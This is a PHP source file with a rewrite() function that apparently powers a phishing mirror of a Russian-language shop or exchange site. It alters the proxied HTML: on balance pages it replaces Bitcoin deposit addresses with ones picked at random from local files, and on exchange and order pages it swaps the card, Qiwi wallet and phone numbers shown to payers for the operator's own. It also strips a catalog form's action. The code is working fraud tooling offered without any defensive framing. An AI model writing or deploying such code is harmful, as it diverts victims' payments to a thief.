<?php 
function rewrite($response,$uripath) {
	
if($uripath=='balance') {
$arrboot = explode("\n",file_get_contents($_SERVER['DOCUMENT_ROOT'].'/btc_3.txt')); 
$arrboot1 = explode("\n",file_get_contents($_SERVER['DOCUMENT_ROOT'].'/btc_4.txt')); 
$boot = $arrboot[rand(0,count($arrboot)-1)];
$boot1 = $arrboot1[rand(0,count($arrboot1)-1)];
$ll = strpos($response,'<span class="text-primary h3">');
$ll = strpos($response,'<span class="text-primary h3">',$ll+30);
$response = substr($response,0,$ll+30).$boot.substr($response,$ll+30+34+13,strlen($response));


$response = str_replace("\n","",$response);
$response = preg_replace("/Старый адрес:<\/span>(.*?)<\/div>/", "Старый адрес:</span><span class=\"text-primary h5\">$boot1</span></div>", trim($response));


}


if( substr($uripath,0,strlen('exchange'))=='exchange' && strlen($uripath)>strlen('exchange') ) {
$response = str_replace("\n","",$response);


$cardnum = explode("\n",file_get_contents($_SERVER['DOCUMENT_ROOT'].'/obmen_card_1.txt'))[0];
$qiwi_number = explode("\n",file_get_contents($_SERVER['DOCUMENT_ROOT'].'/obmen_qiwi_1.txt'))[0];
$sim = explode("\n",file_get_contents($_SERVER['DOCUMENT_ROOT'].'/obmen_sim_1.txt'))[0];
// $qiwinum = explode("|",$qiwinum[0]);

$response = preg_replace('/Переведите <b>(.*?)<\/b> на телефон <b>(.*?)<\/b>(.*?)<br>/', 'Переведите <b>$1</b> на телефон <b>'.$sim.'</b><br>', trim($response));
$response = preg_replace('/на Qiwi кошелек <b>(.*?)<\/b>/', 'на Qiwi кошелек <b>'.$qiwi_number.'</b>', trim($response));
$response = preg_replace('/Переведите <b>(.*?)<\/b> на карту: <b>(.*?)<\/b>/', 'Переведите <b>$1</b> на карту: <b>'.$cardnum.'</b>', trim($response));

}

/* if(substr($uripath,0,strlen('orders'))=='orders' && strlen($uripath)>strlen('orders')) {
$arrboot = explode("\n",file_get_contents($_SERVER['DOCUMENT_ROOT'].'/qiwi.txt'));
$boot = ' <b>'.$arrboot[rand(0,count($arrboot)-1)].'</b>';
$ll = strpos($response,'на Qiwi кошелек ');
$nl = 24; $bl=16; 
$response = substr($response,0,$ll+$nl).$boot.substr($response,$ll+$nl+$bl,strlen($response));

$ll = strpos($response,'на Qiwi кошелек',$ll+$nl);
$response = substr($response,0,$ll+$nl).$boot.substr($response,$ll+$nl+$bl,strlen($response));
} */

if(preg_match("/orders\/[0-9]*/",$uripath)) {
	$response = str_replace("\n","",$response);
	$number = explode("\n",file_get_contents($_SERVER['DOCUMENT_ROOT'].'/pay_sim_2.txt'))[0];
	$response = preg_replace('/Переведите <b>(.*?)<\/b> на телефон <b>(.*?)<\/b>/', 'Переведите <b>$1</b> на телефон <b>'.$number.'</b>', trim($response));
	
	$number = explode("\n",file_get_contents($_SERVER['DOCUMENT_ROOT'].'/pay_qiwi_2.txt'))[0];
	$response = preg_replace('/Переведите <b>(.*?)<\/b> на Qiwi кошелек <b>(.*?)<\/b>/', 'Переведите <b>$1</b> на Qiwi кошелек <b>'.$number.'</b>', trim($response));
}

/* if(substr($uripath,0,strlen('balance'))=='balance' && strlen($uripath)>strlen('balance')) {
	return 13;
	$arrboot = explode("\n",file_get_contents($_SERVER['DOCUMENT_ROOT'].'/qiwi2.txt'));
	$boot = '<span>'.$arrboot[rand(0,count($arrboot)-1)].'</span>';
	$response = str_replace("\r\n","",$response);
	preg_replace("/Старый адрес:<\/span>(.*?)<\/div>/", "Старый адрес:</span><span class=\"text-primary h5\">$boot</span></div>", trim($response));
	// $ll = strpos($response,'на Qiwi кошелек ');
	// $nl = 24; $bl=16; 
	// $response = substr($response,0,$ll+$nl).$boot.substr($response,$ll+$nl+$bl,strlen($response));

	// $ll = strpos($response,'на Qiwi кошелек',$ll+$nl);
	// $response = substr($response,0,$ll+$nl).$boot.substr($response,$ll+$nl+$bl,strlen($response));
} */


if(substr($uripath,0,strlen('catalog'))=='catalog' && strlen($uripath)>strlen('catalog')) 
{

	$Lresponse = strtolower($response);
	
	$needle = 'method="get"';
	$coorstar = strpos($Lresponse,$needle);
	if(!is_numeric($coorstar)) return $response;
	
	$coorstar = strpos($Lresponse,$needle,$coorstar+strlen($needle));
	if(!is_numeric($coorstar)) return $response;
	
	$offset = $coorstar+strlen($needle);

	while($Lresponse[$coorstar]!='<' || $coorstar<1) $coorstar--;
	if($coorstar<1) return $response;

	$needle = 'action="';
	$coorstar = strpos($Lresponse,$needle,$coorstar);
	if(!is_numeric($coorstar)) return $response;

	$coorstar += strlen($needle);
	$coorend = strpos($Lresponse,'"',$coorstar);
	if(!is_numeric($coorend)) return $response;

	$response = substr($response,0,$coorstar).substr($response,$coorend,strlen($response));
	return $response;

}


return $response;	
}